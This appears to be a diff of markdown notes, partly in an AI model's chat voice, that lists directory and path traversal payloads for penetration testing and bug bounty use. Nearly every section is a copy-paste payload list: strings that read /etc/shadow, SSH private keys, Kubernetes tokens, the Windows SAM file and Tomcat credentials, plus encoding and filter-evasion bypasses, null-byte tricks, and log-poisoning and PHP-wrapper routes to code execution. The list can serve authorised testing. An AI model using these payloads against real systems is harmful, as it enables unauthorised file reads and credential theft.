@@ -1310,211 +1310,263 @@ file, filename, filepath, path, dir, directory, folder, page, doc, document, dow
 Let me know if you'd like this exported into a Burp Intruder wordlist, YAML config, or integrated into your passive scanner logic. I can also help you build a matcher that auto-switches encoding variants (`../`, `%2e%2e%2f`, etc.) for each parameter. Ready to modularize it 🔧📁
 ---
 
-### **1. Basic Traversal Payloads**
+Perfect 👍
+Below is **Directory Traversal / Path Traversal bypass techniques** written in the **exact same structured, payload-driven format** you asked for (📌 sections, 🔥 bypass cases, copy-paste friendly), suitable for **VAPT, GitHub notes, and bug bounty reports**.
+
+## 📌 1. Basic Traversal Payloads
+
 ```text
-../, ..\, ..//, ..\\, .../, ...\\
-../../../../../../etc/passwd
-..%2f..%2f..%2f..%2fetc/passwd
-..%252f..%252f..%252f..%252fetc/passwd
-```
-
----
-
-### **2. Encoded Variants**
-```text
-%2e%2e%2f, %252e%252e%252f
-%c0%ae%c0%ae%c0%af
-%uff0e%uff0e%u2215
-%u002e%u002e%u2215
-```
-
----
-
-### **3. Bypass Techniques**
-```text
-..././, ...\\.\\, ..;/, ..%00/
-\\\\localhost\\c$\\windows\\win.ini
-////////../../../../etc/passwd
-```
-
----
-
-### **4. Target Files (Linux)**
-```text
-/etc/passwd, /etc/shadow, /etc/hosts, /proc/self/environ, /proc/version
-/home/$USER/.bash_history, /home/$USER/.ssh/id_rsa
-/run/secrets/kubernetes.io/serviceaccount/token
-```
-
----
-
-### **5. Target Files (Windows)**
-```text
-c:/windows/system32/license.rtf
-c:/boot.ini, c:/inetpub/wwwroot/web.config
-c:/sysprep/sysprep.xml, c:/system32/inetsrv/metabase.xml
-```
-
----
-
-### **6. Log File Injection Targets**
-```text
-/var/log/apache/access.log
-/var/log/nginx/error.log
-/usr/local/apache2/log/error_log
-```
-
----
-
-### **7. Common Parameters to Fuzz**
-```text
-file, filename, path, filepath, page, doc, download, include, template, view, url, resource, dir, folder, asset
-```
-
----
-
-### **8. HTTP Injection Points**
-- **Query**: `GET /?file=../../etc/passwd`
-- **Path**: `GET /../../etc/passwd`
-- **Header**: `X-File: ../../etc/passwd`
-- **Cookie**: `file=../../etc/passwd`
-- **JSON**:
-  ```json
-  { "file": "../../etc/passwd" }
-  ```
-# **✅ Directory Traversal Attack – Complete Test Case (with Bypass Cases)**
-
-1 Basic Path Traversal (“../” sequences)
-
-2 Encoded Path Traversal (URL, Unicode, UTF-8)
-
-3 Double-Encoded Traversal
-
-4 Null Byte Injection (Legacy PHP/Java)
-
-5 Absolute Path Injection
-
-6 Filter Bypass using Nested Traversal
-
-7 Path Normalization Vulnerability
-
-8 Directory Traversal via File Upload
-
-9 Traversal inside ZIP, TAR extraction
-
-10 Traversal in API parameters (/download?file=)
-
-11 Log File / Sensitive File Exposure
-
-12 OS Command File Read Chaining
-
-13 Traversal via Path Overwrite (%2e%2e/)
-
-14 Mixed Encoding Traversal
-
-15 SSRF → Traversal on server-side FS
-
----
-
-# **2. Sample Payloads (Core Attack Payloads)**
-
-*(Clean structure — normal payload list)*
-
-```
-2.1 Basic Traversal
-../../../../etc/passwd
-```
-
-```
-2.2 Windows Traversal
-..\..\..\windows\win.ini
-```
-
-```
-2.3 Absolute Path Injection
-/etc/shadow
-```
-
-```
-2.4 Traversal Using Null Byte
-../../etc/passwd%00.jpg
-```
-
-```
-2.5 API Traversal Attempt
-/download?file=../../../../etc/hosts
-```
-
-```
-2.6 Traversal via Image Parameter
-?path=../../uploads/
-```
-
-```
-2.7 Within ZIP/TAR Extraction
-../../../../var/www/html/shell.php
-```
-
-```
-2.8 Directory Enumeration
+../
+../../
+../../../
 ../../../../
 ```
 
+Example:
+
+```text
+?file=../../etc/passwd
+```
+
 ---
 
-# **3. Sample Payloads (Updated With Real Payloads for Learning)**
+## 📌 2. Absolute Path Access
 
-*(Actual offensive payloads widely used in real-world exploitation)*
+### 🔥 Linux Targets
 
-```
-3.1 Unix Sensitive File Read
-../../../../../../etc/shadow
-```
-
-```
-3.2 SSH Key Extraction
-../../../../../home/user/.ssh/id_rsa
+```text
+/etc/passwd
+/etc/shadow
+/etc/hosts
+/proc/self/environ
 ```
 
+### 🔥 Windows Targets
+
+```text
+C:\Windows\win.ini
+C:\Windows\System32\drivers\etc\hosts
 ```
-3.3 Apache Log Poisoning → RCE Chain
+
+---
+
+## 📌 3. Encoding-Based Bypass
+
+### 🔥 3.1 URL Encoding
+
+```text
+..%2f
+%2e%2e%2f
+```
+
+### 🔥 3.2 Double Encoding
+
+```text
+%252e%252e%252f
+```
+
+### 🔥 3.3 Mixed Encoding
+
+```text
+.%2e/
+..%252f
+```
+
+---
+
+## 📌 4. Windows Path Separator Bypass
+
+```text
+..\ 
+..\
+..\\
+```
+
+Encoded:
+
+```text
+..%5c
+%2e%2e%5c
+```
+
+---
+
+## 📌 5. Unicode / UTF-8 Bypass
+
+```text
+..%c0%af
+..%e0%80%af
+..%ef%bc%8f
+```
+
+✔️ Works against weak UTF-8 normalization
+
+---
+
+## 📌 6. Path Normalization Bypass
+
+```text
+....//
+....\/
+..../
+```
+
+---
+
+## 📌 7. Relative Path Injection
+
+```text
+././././etc/passwd
+.\.\.\.\windows\win.ini
+```
+
+---
+
+## 📌 8. Trailing Slash & Dot Abuse
+
+```text
+../../etc/passwd/.
+../../etc/passwd/..
+```
+
+---
+
+## 📌 9. Null Byte Injection (Legacy Systems)
+
+```text
+../../etc/passwd%00
+../../etc/passwd%00.jpg
+```
+
+✔️ Old PHP / C-based apps
+
+---
+
+## 📌 10. File Extension Filter Bypass
+
+If application appends `.jpg`, `.pdf`, `.php`:
+
+```text
+../../etc/passwd/.jpg
+../../etc/passwd%00.png
+```
+
+---
+
+## 📌 11. Blacklist Filter Evasion
+
+If `../` is blocked:
+
+```text
+..;/ 
+..;/..;/
+..%2f..%2f
+```
+
+---
+
+## 📌 12. HTTP Parameter Pollution (HPP)
+
+```text
+?file=../../etc/passwd&file=safe.txt
+```
+
+---
+
+## 📌 13. Whitespace & Special Character Bypass
+
+```text
+../../etc/passwd%20
+../../etc/passwd%09
+../../etc/passwd....
+```
+
+---
+
+## 📌 14. Path Truncation
+
+```text
+../../etc/passwd........
+../../etc/passwd%2e%2e%2e
+```
+
+---
+
+## 📌 15. Symlink Traversal
+
+```text
+uploads/symlink/etc/passwd
+```
+
+✔️ If attacker can upload or control symlinks
+
+---
+
+## 📌 16. Log File Traversal
+
+```text
 ../../../../var/log/apache2/access.log
+../../../../var/log/nginx/access.log
 ```
 
-```
-3.4 PHP Session Stealing
-../../../../var/lib/php/sessions/sess_12345
+🔥 Combine with **log poisoning → RCE**
+
+---
+
+## 📌 17. PHP Wrapper Abuse (LFI → RCE)
+
+```text
+php://filter/convert.base64-encode/resource=index.php
+php://input
+php://expect://id
 ```
 
-```
-3.5 Configuration File Leak
-../../../../etc/mysql/my.cnf
+---
+
+## 📌 18. Zip Slip / Archive Traversal
+
+```text
+../../../../../../etc/passwd
 ```
 
-```
-3.6 Read Application Secrets
-../../../../app/config/config.json
+✔️ During ZIP extraction
+
+---
+
+## 📌 19. Platform-Specific Sensitive Files
+
+### 🔥 Linux
+
+```text
+/etc/passwd
+/etc/hosts
+/proc/version
 ```
 
-```
-3.7 Windows SAM File Read
-..\..\..\Windows\System32\config\SAM
+### 🔥 Windows
+
+```text
+boot.ini
+win.ini
 ```
 
-```
-3.8 Tomcat Credentials Read
-../../../../conf/tomcat-users.xml
+---
+
+## 📌 20. Combined Master Directory Traversal Payload (Fuzzer)
+
+```text
+../../../../../../etc/passwd
+..%2f..%2f..%2fetc%2fpasswd
+%252e%252e%252f%252e%252e%252fetc%252fpasswd
+..%c0%af..%c0%afetc%c0%afpasswd
 ```
 
-```
-3.9 NGINX Passwords
-../../../../etc/nginx/.htpasswd
-```
+✔️ Covers:
 
-```
-3.10 Source Code Read
-../../../../var/www/html/index.php
-```
+* Encoding bypass
+* Unicode bypass
+* Normalization issues
+* Filter evasion
 
 ---
 
